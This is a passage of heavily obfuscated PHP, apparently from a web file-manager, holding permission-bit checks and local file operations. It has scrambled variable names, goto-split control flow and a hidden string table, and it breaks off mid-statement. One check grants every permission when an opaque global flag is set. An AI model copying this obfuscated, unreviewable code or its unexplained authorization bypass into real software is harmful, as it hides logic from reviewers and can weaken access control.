$bãÇ—êÛå[1667] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($bãÇ—êÛå[404] => LNG($bãÇ—êÛå[1672]), $bãÇ—êÛå[1663] => $bãÇ—êÛå[1673], $bãÇ—êÛå[1665] => 4, $bãÇ—êÛå[1666] => 1, $bãÇ—êÛå[1667] => self::AUTH_SHOW | self::AUTH_VIEW), array($bãÇ—êÛå[404] => LNG($bãÇ—êÛå[1674]), $bãÇ—êÛå[1663] => $bãÇ—êÛå[1675], $bãÇ—êÛå[1665] => 5, $bãÇ—êÛå[1666] => 1, $bãÇ—êÛå[1667] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($bãÇ—êÛå[404] => LNG($bãÇ—êÛå[1676]), $bãÇ—êÛå[1663] => $bãÇ—êÛå[1677], $bãÇ—êÛå[1665] => 6, $bãÇ—êÛå[1666] => 1, $bãÇ—êÛå[1667] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($bãÇ—êÛå[404] => LNG($bãÇ—êÛå[1678]), $bãÇ—êÛå[1663] => $bãÇ—êÛå[1679], $bãÇ—êÛå[1665] => 7, $bãÇ—êÛå[1666] => 1, $bãÇ—êÛå[1667] => 0)); return $eí¸ĞÂà÷±; } public static function authCheck($a’àÈ•Éˆ®, $DˆŠÇåÔ…) { $a’àÈ•Éˆ® = intval($a’àÈ•Éˆ®); if (_get($GLOBALS, $_SERVER[Æ¼ôºÙï][475])) { return !0; } if ($a’àÈ•Éˆ® <= 0) { return !1; } if (($a’àÈ•Éˆ® & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($a’àÈ•Éˆ® & $DˆŠÇåÔ…); } public static function authCheckShow($eÁµÒ³Ââ) { return self::authCheck($eÁµÒ³Ââ, self::AUTH_SHOW); } public static function authCheckView($CğÛ…¤ä·ˆ) { return self::authCheck($CğÛ…¤ä·ˆ, self::AUTH_VIEW); } public static function authCheckDownload($e¯òá†»¹) { return self::authCheck($e¯òá†»¹, self::AUTH_DOWNLOAD); } public static function authCheckUpload($BÈï°÷‰‘ñ) { return self::authCheck($BÈï°÷‰‘ñ, self::AUTH_UPLOAD); } public static function authCheckEdit($AÀöšÕí Á) { return self::authCheck($AÀöšÕí Á, self::AUTH_EDIT); } public static function authCheckRemove($A¼õ°æÆøÄ) { return self::authCheck($A¼õ°æÆøÄ, self::AUTH_REMOVE); } public static function authCheckShare($cªÚ™†ĞèŞ) { return self::authCheck($cªÚ™†ĞèŞ, self::AUTH_SHARE); } public static function authCheckComment($fÓ  ®Íù’) { return self::authCheck($fÓ  ®Íù’, self::AUTH_COMMENT); } public static function authCheckEvent($b‹ëÈå¤Ö¦) { return self::authCheck($b‹ëÈå¤Ö¦, self::AUTH_EVENT); } public static function authCheckRoot($B¨–°òÙË¢) { return self::authCheck($B¨–°òÙË¢, self::AUTH_ROOT); } public static function authCheckAction($Eì„øˆ¨¨ß, $BŸ½„ó‰è) { goto a ÃéÍËç; bà“Û Šğ: $aªë›ÇÁ¼› = $eâÜ™¡ŠÜŠ[$BŸ½„ó‰è]; $Eì„øˆ¨¨ß = intval($Eì„øˆ¨¨ß); if ($Eì„øˆ¨¨ß <= 0) { return !1; } goto F¿¡Æ…¥; a ÃéÍËç: $B™öÕÅ–Î =& $_SERVER[Æ¼ôºÙï]; $eâÜ™¡ŠÜŠ = array($B™öÕÅ–Î[1680] => self::AUTH_VIEW, $B™öÕÅ–Î[1073] => self::AUTH_DOWNLOAD, $B™öÕÅ–Î[106] => self::AUTH_UPLOAD, $B™öÕÅ–Î[1628] => self::AUTH_EDIT, $B™öÕÅ–Î[1627] => self::AUTH_REMOVE, $B™öÕÅ–Î[1638] => self::AUTH_SHARE, $B™öÕÅ–Î[350] => self::AUTH_COMMENT, $B™öÕÅ–Î[1491] => self::AUTH_EVENT, $B™öÕÅ–Î[1681] => self::AUTH_ROOT); if (!isset($eâÜ™¡ŠÜŠ[$BŸ½„ó‰è])) { return; } goto bà“Û Šğ; F¿¡Æ…¥: if (($Eì„øˆ¨¨ß & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Eì„øˆ¨¨ß & $aªë›ÇÁ¼›); goto Eğõ ¨ÀÛ; Eğõ ¨ÀÛ: } public static function authDisable($BïÕ‰”õ®Í, $cª•ç’íô) { if (intval($BïÕ‰”õ®Í) <= 0) { return 0; } return intval($BïÕ‰”õ®Í) & ~$cª•ç’íô; } public $optionType = "\123\x79\x73\164\145\x6d\x2e\163\157\x75\x72\x63\x65\x41\x75\164\150\x4c\x69\163\164"; public $field = array("\x6e\141\x6d\x65", "\141\x75\164\x68", "\x6c\141\x62\x65\x6c", "\x64\151\x73\x70\x6c\141\171", "\x73\171\x73\164\x65\x6d", "\x73\157\x72\164"); public function initData() { $f¥ğØ„ùÀÉ = $this->authDefault(); foreach ($f¥ğØ„ùÀÉ as $D³¿İ ‚ìÈ) { $this->add($D³¿İ ‚ìÈ); } } public function listData($eÌù”ËÑ©Â = false, $EÉÅŠéŒÒ› = "\x73\x6f\162\164", $Fùø¯ï†½¢ = false) { return parent::listData($eÌù”ËÑ©Â, $EÉÅŠéŒÒ›, $Fùø¯ï†½¢); } public function update($A‰Øù•Š·, $bÀ“ê˜•Ë) { $Dİ›ù‰º§ =& $_SERVER[Æ¼ôºÙï]; $dÂ‘¸¿Áæè = parent::listData($A‰Øù•Š·); $bÕŞÈŞßŠÚ = $this->findByName($bÀ“ê˜•Ë[$Dİ›ù‰º§[28]]); if (!$dÂ‘¸¿Áæè || $bÕŞÈŞßŠÚ && $bÕŞÈŞßŠÚ[$Dİ›ù‰º§[385]] != $dÂ‘¸¿Áæè[$Dİ›ù‰º§[385]]) { return !1; } $this->filterAuth($bÀ“ê˜•Ë[$Dİ›ù‰º§[394]]); return parent::update($A‰Øù•Š·, $bÀ“ê˜•Ë); } public function remove($bŸ‚ÎïŠÆÄ) { $Eß‰·®½•ä = parent::listData($bŸ‚ÎïŠÆÄ); if (!$Eß‰·®½•ä || $Eß‰·®½•ä[$_SERVER[Æ¼ôºÙï][1146]]) { return !1; } return parent::remove($bŸ‚ÎïŠÆÄ); } public function add($d¨”…†ß³÷ = array()) { goto bË˜çªô…Ÿ; A«Ì†î¼¶İ: $d¨”…†ß³÷ = array_merge($bÙÅµ–ƒÌÚ, $d¨”…†ß³÷); $d¨”…†ß³÷[$cï‚Â…¡–[1684]] = $this->getSort(); $this->filterAuth($d¨”…†ß³÷[$cï‚Â…¡–[394]]); goto BùÒ„”Üé; BùÒ„”Üé: return parent::insert($d¨”…†ß³÷); goto cÍ†á•¸áÎ; bË˜çªô…Ÿ: $cï‚Â…¡– =& $_SERVER[Æ¼ôºÙï]; if ($this->findByName($d¨”…†ß³÷[$cï‚Â…¡–[28]])) { return !1; } $bÙÅµ–ƒÌÚ = array($cï‚Â…¡–[28] => $cï‚Â…¡–[33], $cï‚Â…¡–[394] => 1, $cï‚Â…¡–[1682] => $cï‚Â…¡–[1671], $cï‚Â…¡–[1683] => 1, $cï‚Â…¡–[1146] => 0, $cï‚Â…¡–[1684] => 0); goto A«Ì†î¼¶İ; cÍ†á•¸áÎ: } private function getSort() { $FŸ›±”ãï =& $_SERVER[Æ¼ôºÙï]; $A‹Â±‚ºØ… = parent::listData(); $CóæÒˆéÈÈ = array_to_keyvalue($A‹Â±‚ºØ…, $FŸ›±”ãï[33], $FŸ›±”ãï[1684]); return empty($CóæÒˆéÈÈ) ? 0 : max($CóæÒˆéÈÈ) + 1; } private function filterAuth(&$cèÂ®¦Ş…Õ) { goto FÕÅ‰Ğ¨í; bÃÙ±‡øÚ¯: foreach ($BË¿©¤œµ× as $BñÎÅ–Íçñ) { if ($cèÂ®¦Ş…Õ & $BñÎÅ–Íçñ) { $cîŒÆîŒÉğ[] = $BñÎÅ–Íçñ; } } if (in_array(self::AUTH_ROOT, $cîŒÆîŒÉğ)) { $cèÂ®¦Ş…Õ = array_sum($BË¿©¤œµ×); return; } $BÓ¼‡ˆ×†Æ = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); goto AãŠçÍ¯óµ; FÕÅ‰Ğ¨í: if (!$cèÂ®¦Ş…Õ) { return; } $BË¿©¤œµ× = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $cîŒÆîŒÉğ = array(); goto bÃÙ±‡øÚ¯; AãŠçÍ¯óµ: foreach ($cîŒÆîŒÉğ as $BñÎÅ–Íçñ) { if (isset($BÓ¼‡ˆ×†Æ[$BñÎÅ–Íçñ])) { $cîŒÆîŒÉğ = array_merge($cîŒÆîŒÉğ, $BÓ¼‡ˆ×†Æ[$BñÎÅ–Íçñ]); } } $cîŒÆîŒÉğ[] = self::AUTH_SHOW; $cèÂ®¦Ş…Õ = array_sum(array_unique($cîŒÆîŒÉğ)); goto b§Ó†÷†Ä›; b§Ó†÷†Ä›: } public function sort($BºÛÆˆ¹êô, $e¸ÏÌôµÜ) { return parent::update($BºÛÆˆ¹êô, $e¸ÏÌôµÜ); } } goto f¿”µ­Ş•; FÓ˜ÂË»øë: class PathDriverLocal extends PathDriverBase { public function __construct() { parent::__construct(); } public function getPath($e—Ëê’ë£é) { if (substr($e—Ëê’ë£é, 0, 2) == $_SERVER[Æ¼ôºÙï][1220]) { $e—Ëê’ë£é = BASIC_PATH . substr($e—Ëê’ë£é, 2); } return $e—Ëê’ë£é; } public function iconvApp($dÒƒ…÷³óØ) { $F©¦Ç×›Ÿë =& $_SERVER[Æ¼ôºÙï]; global $config; return $this->iconvTo($dÒƒ…÷³óØ, $config[$F©¦Ç×›Ÿë[1218]], $config[$F©¦Ç×›Ÿë[1217]]); } public function iconvSystem($A…¹¦ÑšŠ·) { $B“ºŒğğÀÓ =& $_SERVER[Æ¼ôºÙï]; global $config; return $this->iconvTo($A…¹¦ÑšŠ·, $config[$B“ºŒğğÀÓ[1217]], $config[$B“ºŒğğÀÓ[1218]]); } public function getPathOuter($b³öÄõÏå”) { goto C²ôË»Ãõ®; C²ôË»Ãõ®: $E¢¦Ë›œß =& $_SERVER[Æ¼ôºÙï]; $F¦­ä•†Ô = $this->iconvApp($this->pathBase); $b³öÄõÏå” = $this->iconvApp($b³öÄõÏå”); goto Aïååöçù; fŸï‡³á–: $b³öÄõÏå” = KodIO::clear($b³öÄõÏå”); $b³öÄõÏå” = substr($b³öÄõÏå”, strlen($F¦­ä•†Ô)); if (empty($this->pathDriver)) { return $b³öÄõÏå”; } goto A‚‚™¦Ö‰Ø; Aïååöçù: if (substr($F¦­ä•†Ô, 0, 2) == $E¢¦Ë›œß[1220]) { $F¦­ä•†Ô = BASIC_PATH . substr($F¦­ä•†Ô, 2); } if (substr($b³öÄõÏå”, 0, 2) == $E¢¦Ë›œß[1220]) { $b³öÄõÏå” = BASIC_PATH . substr($b³öÄõÏå”, 2); } $F¦­ä•†Ô = KodIO::clear($F¦­ä•†Ô); goto fŸï‡³á–; A‚‚™¦Ö‰Ø: return $this->pathDriver . $E¢¦Ë›œß[8] . ltrim($b³öÄõÏå”, $E¢¦Ë›œß[8]); goto e×Š•‘Ë; e×Š•‘Ë: } public function mkfile($cÍ¾Ò ˆğÕ, $c‰¯‚¨ğ™« = '', $bÍ¨ñÕ¥”ô = REPEAT_RENAME) { $cÍ¾Ò ˆğÕ = $this->iconvSystem($cÍ¾Ò ˆğÕ); @touch($cÍ¾Ò ˆğÕ); if ($c‰¯‚¨ğ™«) { file_put_contents($cÍ¾Ò ˆğÕ, $c‰¯‚¨ğ™«); } return is_file($cÍ¾Ò ˆğÕ) ? $this->getPathOuter($cÍ¾Ò ˆğÕ) : !1; } public function mkdir($D®Ÿ†ºÖğÓ, $Dà—Ëø­ˆÅ = REPEAT_SKIP) { $D®Ÿ†ºÖğÓ = $this->iconvSystem($D®Ÿ†ºÖğÓ); if (is_dir($D®Ÿ†ºÖğÓ)) { return $this->getPathOuter($D®Ÿ†ºÖğÓ); } @mkdir($D®Ÿ†ºÖğÓ, 511, !0); return is_dir($D®Ÿ†ºÖğÓ) ? $this->getPathOuter($D®Ÿ†ºÖğÓ) : !1; } public function copyFile($A²Í¯ÚØ‹Æ, $cŸ±­‡Œ›í) { $this->mkdir($this->pathFather($cŸ±­‡Œ›í)); $A²Í¯ÚØ‹Æ = $this->iconvSystem($A²Í¯ÚØ‹Æ); $cŸ±­‡Œ›í = $this->iconvSystem($cŸ±­‡Œ›í); $CÓ£ÈÎŞ»Ú = copy_64($A²Í¯ÚØ‹Æ, $cŸ±­‡Œ›í); return $CÓ£ÈÎŞ»Ú ? $this->getPathOuter($cŸ±­‡Œ›í) : !1; } public function moveFile($aöÌ„™°›æ, $Dß…À´š´ò) { $this->mkdir($this->pathFather($Dß…À´š´ò)); $aöÌ„™°›æ = $this->iconvSystem($aöÌ„™°›æ); $Dß…À´š´ò = $this->iconvSystem($Dß…À´š´ò); $dÂô»Ìˆ«¿ = intval(@rename($aöÌ„™°›æ, $Dß…À´š´ò)); if (!$dÂô»Ìˆ«¿) { if ($dÂô»Ìˆ«¿ = intval(@copy_64($aöÌ„™°›æ, $Dß…À´š´ò))) { @unlink($aöÌ„™°›æ); } } return $dÂô»Ìˆ«¿ ? $this->getPathOuter($Dß…À´š´ò) : !1; } public function delFile($c‘õ§·º­) { $c‘õ§·º­ = $this->iconvSystem($c‘õ§·º­); if (!@unlink($c‘õ§·º­)) { @chmod($c‘õ§·º­, 511); if (!@unlink($c‘õ§·º­)) { return !1; } } else { return !0; } } public function delFolder($BÎŞ÷Øââ) { goto AÌĞ®†Ş‹Â; aõÇÎˆ¼’Å: if (!($a‚÷Ò¿Î›Å = opendir($BÎŞ÷Øââ))) { return !1; } while (($CÆ¡œöÉò = readdir($a‚÷Ò¿Î›Å)) !== !1) { if ($CÆ¡œöÉò == $Cá§ìñâ„Ò[94] || $CÆ¡œöÉò == $Cá§ìñâ„Ò[1227]) { continue; } $B§Ü”­˜¡Ö = $BÎŞ÷Øââ . $Cá§ìñâ„Ò[8] . $CÆ¡œöÉò; if (is_file($B§Ü”­˜¡Ö) || is_link($B§Ü”­˜¡Ö)) { if (!unlink($B§Ü”­˜¡Ö)) { chmod($B§Ü”­˜¡Ö, 511); if (!unlink($B§Ü”­˜¡Ö)) { return !1; } } } else { if (is_dir($B§Ü”­˜¡Ö)) { chmod($B§Ü”­˜¡Ö, 511); $B§Ü”­˜¡Ö = $this->iconvApp($B§Ü”­˜¡Ö); if (!$this->delFolder($B§Ü”­˜¡Ö)) { return !1; } } } } closedir($a‚÷Ò¿Î›Å); goto EÚ¸·Âá‰ö; AÌĞ®†Ş‹Â: $Cá§ìñâ„Ò =& $_SERVER[Æ¼ôºÙï]; $BÎŞ÷Øââ = $this->iconvSystem($BÎŞ÷Øââ); if (!is_dir($BÎŞ÷Øââ)) { return !0; } goto aõÇÎˆ¼’Å; EÚ¸·Âá‰ö: return rmdir($BÎŞ÷Øââ); goto DŞÁ÷Ê™­„; DŞÁ÷Ê™­„: } public function rename($B£Íë ×îó, $d‚ØÅí¢ÅÏ) { goto dÄ¾°ô´»ê; dõÊ£Ü‚ª¤: $B£Íë ×îó = $this->iconvSystem($B£Íë ×îó); $Dœ¬¡ê› = $this->pathFather($B£Íë ×îó); $D‰Í½Ú„›‰ = rtrim($Dœ¬¡ê›, $E»ò±™ì—[8]) . $E»ò±™ì—[8] . $C˜® ©»ÇÏ; goto Eİ‡ã°½…ò; dÄ¾°ô´»ê: $E»ò±™ì— =& $_SERVER[Æ¼ôºÙï]; $C˜® ©»ÇÏ = $this->fileNameAuto($this->pathFather($B£Íë ×îó), $d‚ØÅí¢ÅÏ); $C˜® ©»ÇÏ = $this->iconvSystem($C˜® ©»ÇÏ); goto dõÊ£Ü‚ª¤; Eİ‡ã°½…ò: $C¢ó…’ÖŸ = @rename($B£Íë ×îó, $D‰Í½Ú„›‰); $D‰Í½Ú„›‰ = $this->iconvApp($D‰Í½Ú„›‰); return $C¢ó…’ÖŸ ? $this->getPathOuter($D‰Í½Ú„›‰) : !1; goto FÛó±ùÙê³; FÛó±ùÙê³: } public function size($eøíƒÉ°òÇ) { $eøíƒÉ°òÇ = $this->iconvSystem($eøíƒÉ°òÇ); return filesize_64($eøíƒÉ°òÇ); } public function info($bÅËÛºí“£) { $bÅËÛºí“£ = $this->iconvSystem($bÅËÛºí“£); if ($this->isFolder($bÅËÛºí“£)) { return $this->folderInfo($bÅËÛºí“£); } else { if ($this->isFile($bÅËÛºí“£)) { return $this->fileInfo($bÅËÛºí“£); } } return !1; } protected function infoChildren($C›ëÈªÀÙš, &$a¥õ†ËÕµŠ, $a‚š¹†ä« = true) { goto EæŸ”‡Ñ¸¬; EæŸ”‡Ñ¸¬: $E—ŒµÏá =& $_SERVER[Æ¼ôºÙï]; check_abort_echo(); $C›ëÈªÀÙš = rtrim($C›ëÈªÀÙš, $E—ŒµÏá[8]) . $E—ŒµÏá[8]; goto Aô÷¹•×Ä‘; Aô÷¹•×Ä‘: if ($a‚š¹†ä«) { $C›ëÈªÀÙš = $this->iconvSystem($C›ëÈªÀÙš); } if (!($Aæ‹ƒÄ…¢ = @opendir($C›ëÈªÀÙš))) { return; } while (($d¼Áç²ÓÂ‚ = readdir($Aæ‹ƒÄ…¢)) !== !1) { if ($d¼Áç²ÓÂ‚ == $E—ŒµÏá[94] || $d¼Áç²ÓÂ‚ == $E—ŒµÏá[1227]) { continue; } $Câ•´ÅÅ× = $C›ëÈªÀÙš . $d¼Áç²ÓÂ‚; if (is_file($Câ•´ÅÅ×) || is_link($Câ•´ÅÅ×)) { $a¥õ†ËÕµŠ[$E—ŒµÏá[78]]++; $a¥õ†ËÕµŠ[$E—ŒµÏá[77]] += filesize_64($Câ•´ÅÅ×); } else { if (is_dir($Câ•´ÅÅ×)) { $a¥õ†ËÕµŠ[$E—ŒµÏá[79]]++; $this->infoChildren($Câ•´ÅÅ×, $a¥õ†ËÕµŠ, !1); } } } goto AÌÊ‡¾ˆŠê; AÌÊ‡¾ˆŠê: closedir($Aæ‹ƒÄ…¢); goto FÒ·Î‡Ù; FÒ·Î‡Ù: } private function folderInfo($E¦‡Â×áåº, $CÅù Á¦İƒ = false) { $DÁ»Œ‡æƒƒ =& $_SERVER[Æ¼ôºÙï]; $E¦‡Â×áåº = rtrim($E¦‡Â×áåº, $DÁ»Œ‡æƒƒ[8]) . $DÁ»Œ‡æƒƒ[8]; $e”Ò¥øÎÚ‡ = $this->iconvApp($this->pathThis($E¦‡Â×áåº)); if ($CÅù Á¦İƒ) { return array($DÁ»Œ‡æƒƒ[28] => $e”Ò¥øÎÚ‡, $DÁ»Œ‡æƒƒ[75] => $this->getPathOuter($E¦‡Â×áåº), $DÁ»Œ‡æƒƒ[29] => $DÁ»Œ‡æƒƒ[76]); } $B·—Äó‡¨‰ = array($DÁ»Œ‡æƒƒ[28] => $e”Ò¥øÎÚ‡, $DÁ»Œ‡æƒƒ[75] => $this->getPathOuter($E¦‡Â×áåº), $DÁ»Œ‡æƒƒ[29] => $DÁ»Œ‡æƒƒ[76], $DÁ»Œ‡æƒƒ[192] => @filectime($E¦‡Â×áåº), $DÁ»Œ‡æƒƒ[83] => @filemtime($E¦‡Â×áåº), $DÁ»Œ‡æƒƒ[1230] => @fileatime($E¦‡Â×áåº), $DÁ»Œ‡æƒƒ[1231] => is_readable($E¦‡Â×áåº), $DÁ»Œ‡æƒƒ[1232] => is_writable($E¦‡Â×áåº), $DÁ»Œ‡æƒƒ[1233] => get_mode($E¦‡Â×áåº)); return $B·—Äó‡¨‰; } private function fileInfo($Aµ«ÃÄ½š, $EÆøÌ‰Ö‹ó = false) { $f¿¬ÊÒ®­ =& $_SERVER[Æ¼ôºÙï]; $D¡‹Â³Ö = $this->iconvApp($this->pathThis($Aµ«ÃÄ½š)); if ($EÆøÌ‰Ö‹ó) { return array($f¿¬ÊÒ®­[28] => $D¡‹Â³Ö, $f¿¬ÊÒ®­[75] => $this->getPathOuter($Aµ«ÃÄ½š), $f¿¬ÊÒ®­[29] => $f¿¬ÊÒ®­[173], $f¿¬ÊÒ®­[77] => $this->size($Aµ«ÃÄ½š), $f¿¬ÊÒ®­[167] => $this->ext($D¡‹Â³Ö)); } $Fƒ¨˜‹²á = array($f¿¬ÊÒ®­[28] => $D¡‹Â³Ö, $f¿¬ÊÒ®­[75] => $this->getPathOuter($Aµ«ÃÄ½š), $f¿¬ÊÒ®­[29] => $f¿¬ÊÒ®­[173], $f¿¬ÊÒ®­[192] => @filectime($Aµ«ÃÄ½š), $f¿¬ÊÒ®­[83] => @filemtime($Aµ«ÃÄ½š), $f¿¬ÊÒ®­[1230] => @fileatime($Aµ«ÃÄ½š), $f¿¬ÊÒ®­[77] => $this->size($Aµ«ÃÄ½š), $f¿¬ÊÒ®­[167] => $this->ext($D¡‹Â³Ö), $f¿¬ÊÒ®­[1231] => is_readable($Aµ«ÃÄ½š), $f¿¬ÊÒ®­[1232] => is_writable($Aµ«ÃÄ½š), $f¿¬ÊÒ®­[1233] => get_mode($Aµ«ÃÄ½š)); return $Fƒ¨˜‹²á; } public function exist($Dö“§¼“êå) { $Dö“§¼“êå = $this->iconvSystem($Dö“§¼“êå); return @file_exists($Dö“§¼“êå); } public function isFile($EÄ ÍÖ¶õÔ) { $EÄ ÍÖ¶õÔ = $this->iconvSystem($EÄ ÍÖ¶õÔ); return @is_file($EÄ ÍÖ¶õÔ); } public function isFolder($B¬ÚªìôÜ) { $B¬ÚªìôÜ = $this->iconvSystem($B¬ÚªìôÜ); return @is_dir($B¬ÚªìôÜ); } public function listPath($b™‚®˜ñ‰, $C¿Èõ¹š™ª = false) { goto CŒ–åğŒ´; AÅ‡…­î‰¹: $F êŸ»£èÌ = array($A²ƒ°àô¦×[74] => array(), $A²ƒ°àô¦×[73] => array()); if (!($bà›ˆÜïÑÉ = @opendir($b™‚®˜ñ‰))) { return $F êŸ»£èÌ; } while (($dëÔğå¼¸ = readdir($bà›ˆÜïÑÉ)) !== !1) { if ($dëÔğå¼¸ == $A²ƒ°àô¦×[94] || $dëÔğå¼¸ == $A²ƒ°àô¦×[1227]) { continue; } $Fœ¿…„çùÔ = $b™‚®˜ñ‰ . $dëÔğå¼¸; if (is_file($Fœ¿…„çùÔ)) { $F êŸ»£èÌ[$A²ƒ°àô¦×[73]][] = $this->fileInfo($Fœ¿…„çùÔ, $C¿Èõ¹š™ª); } else { $F êŸ»£èÌ[$A²ƒ°àô¦×[74]][] = $this->folderInfo($Fœ¿…„çùÔ, $C¿Èõ¹š™ª); } } goto cù¦ĞÖÄ¹¯; CŒ–åğŒ´: $A²ƒ°àô¦× =& $_SERVER[Æ¼ôºÙï]; $b™‚®˜ñ‰ = $this->iconvSystem($b™‚®˜ñ‰); $b™‚®˜ñ‰ = rtrim($b™‚®˜ñ‰, $A²ƒ°àô¦×[8]) . $A²ƒ°àô¦×[8]; goto AÅ‡…­î‰¹; cù¦ĞÖÄ¹¯: closedir($bà›ˆÜïÑÉ); return $F êŸ»£èÌ; goto d°õöìêàã; d°õöìêàã: } public function listAll($f–æèê±†Ö, &$döÖ„¢¥Œ‡ = array()) { goto cÍí×†áÌ†; Fó²·ğ³‡í: return $döÖ„¢¥Œ‡; goto bÀ¿ŸÇ·é²; A¡‹Ñ…å±¼: if (!($f£ÌŞÁçœŒ = @opendir($f–æèê±†Ö))) { return $döÖ„¢¥Œ‡; } while (($eÄ„®¯©Òß = readdir($f£ÌŞÁçœŒ)) !== !1) { if ($eÄ„®¯©Òß == $D’ƒÉ¥¶µ¦[94] || $eÄ„®¯©Òß == $D’ƒÉ¥¶µ¦[1227]) { continue; } $DÎ‰‡ë®¤ø = $f–æèê±†Ö . $eÄ„®¯©Òß; if (is_dir($DÎ‰‡ë®¤ø) && !is_link($DÎ‰‡ë®¤ø)) { $döÖ„¢¥Œ‡[] = array($D’ƒÉ¥¶µ¦[75] => $DÎ‰‡ë®¤ø . $D’ƒÉ¥¶µ¦[8], $D’ƒÉ¥¶µ¦[76] => 1, $D’ƒÉ¥¶µ¦[83] => @filemtime($DÎ‰‡ë®¤ø), $D’ƒÉ¥¶µ¦[77] => 0); $this->listAll($DÎ‰‡ë®¤ø, $döÖ„¢¥Œ‡); } else { $döÖ„¢¥Œ‡[] = array($D’ƒÉ¥¶µ¦[75] => $DÎ‰‡ë®¤ø, $D’ƒÉ¥¶µ¦[76] => 0, $D’ƒÉ¥¶µ¦[83] => @filemtime($DÎ‰‡ë®¤ø), $D’ƒÉ¥¶µ¦[77] => $this->size($DÎ‰‡ë®¤ø)); } } closedir($f£ÌŞÁçœŒ); goto Fó²·ğ³‡í; cÍí×†áÌ†: $D’ƒÉ¥¶µ¦ =& $_SERVER[Æ¼ôºÙï]; $f–æèê±†Ö = $this->iconvSystem($f–æèê±†Ö); $f–æèê±†Ö = rtrim($f–æèê±†Ö, $D’ƒÉ¥¶µ¦[8]) . $D’ƒÉ¥¶µ¦[8]; goto A¡‹Ñ…å±¼; bÀ¿ŸÇ·é²: } public function has($e½‹¯¦ö½Š, $aÄÏôğô‰Ê = false, $C³àáë®™Ï = true) { goto bàòçï„Ø·; dÙÏ°Š†ÍÆ: $bÊªÄ¥—· = 0; while (($E¼«—šÁ±µ = readdir($cƒã„äÁ)) !== !1) { if ($E¼«—šÁ±µ == $bøÕ¿‰™›É[94] || $E¼«—šÁ±µ == $bøÕ¿‰™›É[1227]) { continue; } $EÀ‘‹µà·¿ = $e½‹¯¦ö½Š . $E¼«—šÁ±µ; if ($aÄÏôğô‰Ê) { $bÊªÄ¥—·++; if (@is_file($EÀ‘‹µà·¿)) { $Díğ„Ä¬×¡++; } else { $e¼ÊğÇî»š++; } if ($bÊªÄ¥—· > 10000) { break; } continue; } if ($C³àáë®™Ï) { if (@is_file($EÀ‘‹µà·¿)) { return !0; } } else { if (@is_dir($EÀ‘‹µà·¿ . $bøÕ¿‰™›É[8])) { return !0; } } } closedir($cƒã„äÁ); goto b‘Ñ‚±÷Ë»; bàòçï„Ø·: $bøÕ¿‰™›É =& $_SERVER[Æ¼ôºÙï]; $e½‹¯¦ö½Š = $this->iconvSystem($e½‹¯¦ö½Š); $e½‹¯¦ö½Š = rtrim($e½‹¯¦ö½Š, $bøÕ¿‰™›É[8]) . $bøÕ¿‰™›É[8]; goto eÔøŠ¹ŠÍ; eÔøŠ¹ŠÍ: if (!($cƒã„äÁ = @opendir($e½‹¯¦ö½Š))) { return !1; } $Díğ„Ä¬×¡ = 0; $e¼ÊğÇî»š = 0; goto dÙÏ°Š†ÍÆ; b‘Ñ‚±÷Ë»: if ($aÄÏôğô‰Ê) { return array($bøÕ¿‰™›É[201] => $Díğ„Ä¬×¡, $bøÕ¿‰™›É[202] => $e¼ÊğÇî»š); } return !1; goto dˆ¡Ìê·Ú; dˆ¡Ìê·Ú: } public function hashSimple($a÷°ÉêÏ¢) { goto cò‹Ò ­Â; Eß·ÁÀÓŠğ: fseek_64($CÏí¡ášé‰, $AÚ´Êéß¸Ü - $aİºô‰‰Ó™); $aùÊèèñĞø .= fread($CÏí¡ášé‰, $aİºô‰‰Ó™); fclose($CÏí¡ášé‰); goto f½ŸÃÃÈÄ; cò‹Ò ­Â: $aŒìÍºˆÑ =& $_SERVER[Æ¼ôºÙï]; if (!$a÷°ÉêÏ¢) { return md5($aŒìÍºˆÑ[33]); } $a÷°ÉêÏ¢ = $this->iconvSystem($a÷°ÉêÏ¢); goto e–¤àœËá; e–¤àœËá: $AÚ´Êéß¸Ü = $this->size($a÷°ÉêÏ¢); $aİºô‰‰Ó™ = 200; $EÛÀ”“¡¤ù = 50; goto B±ÀíÉÚ; dæ—ëíÒ‚: $CÏí¡ášé‰ = fopen($a÷°ÉêÏ¢, $aŒìÍºˆÑ[1234]); if (!$CÏí¡ášé‰) { return $aùÊèèñĞø; } for ($c”ÔÓÄƒÀ² = 0; $c”ÔÓÄƒÀ² < $EÛÀ”“¡¤ù; $c”ÔÓÄƒÀ²++) { fseek_64($CÏí¡ášé‰, $B˜—ÍÆ * $c”ÔÓÄƒÀ²); $aùÊèèñĞø .= fread($CÏí¡ášé‰, $aİºô‰‰Ó™); } goto Eß·ÁÀÓŠğ; f½ŸÃÃÈÄ: return md5($aùÊèèñĞø) . $AÚ´Êéß¸Ü; goto d¢ªŞÓ”¯; B±ÀíÉÚ: if ($AÚ´Êéß¸Ü <= $aİºô‰‰Ó™ * $EÛÀ”“¡¤ù) { return $this->hashMd5($a÷°ÉêÏ¢) . $AÚ´Êéß¸Ü; } $aùÊèèñĞø = $aŒìÍºˆÑ[33]; $B˜—ÍÆ = intval($AÚ´Êéß¸Ü / $EÛÀ”“¡¤ù); goto dæ—ëíÒ‚; d¢ªŞÓ”¯: } public function getContent($D¼•Ğµì ‹) { $D¼•Ğµì ‹ = $this->iconvSystem($D¼•Ğµì ‹); return file_get_contents($D¼•Ğµì ‹); } public function setContent($eİ²Â©Ö¡÷, $E±½Ñ´…êõ = '') { $eİ²Â©Ö¡÷ = $this->iconvSystem($eİ²Â©Ö¡÷); $cêÙŠÉ££ = 